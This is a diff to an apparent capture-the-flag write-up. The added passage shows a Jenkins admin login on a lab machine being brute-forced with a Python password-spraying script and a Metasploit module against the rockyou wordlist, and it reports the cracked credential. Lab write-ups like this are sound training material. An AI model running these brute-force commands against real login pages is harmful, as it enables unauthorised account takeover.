@@ -222,6 +222,42 @@ aubreanna@internal:~$ 2024/11/16 08:37:32 client: Connecting to ws://10.11.101.4
 
 + Access successfully page Jenkins, we try the default credential admin:admin
 --> But not success
-+ We try to brute force the credential admin.
-  
++ We try to brute force the credential admin. But we can not brute-force normaly by using Hydra so we need to use other way to brute-force.
++ We can use script python or Metasploit to brute-force.
++ Link: "https://github.com/RajChowdhury240/Jenkins-PenTest"
+
+```bash
+# Using script Python:
+    zicco@z-a:~/Documents/CTFs/Internal/Jenkins-PenTest$ python3 jenkins_password_spraying.py --help
+usage: jenkins_password_spraying.py [-h] [-u USER] [-U USER_FILE] [-p PASSWORD] [-P PASSWORD_FILE]
+                                    [-e]
+                                    url [url ...]
+
+Jenkins password sprayer
+options:
+  -h, --help            show this help message and exit
+  -u USER, --user USER
+  -U USER_FILE, --user_file USER_FILE
+  -p PASSWORD, --password PASSWORD
+  -P PASSWORD_FILE, --password_file PASSWORD_FILE
+  -e, --additional_checks
+                        Try username as password
+    zicco@z-a:~/Documents/CTFs/Internal/Jenkins-PenTest$ python3 jenkins_password_spraying.py --user admin --password_file /usr/share/wordlists/rockyou.txt http://127.0.0.1:8080/login 
+Matching password spongebob for user admin
+```
+
+```bash
+# Using Metasploit
+# We just set some parameters which we need like PASS_FILE, RHOSTS, THREADS, USERNAME
+msf6 auxiliary(scanner/http/jenkins_login) > options
+msf6 auxiliary(scanner/http/jenkins_login) > run
+
+[+] 127.0.0.1:8080 - Login Successful: admin:spongebob
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
++ 
+
+
 
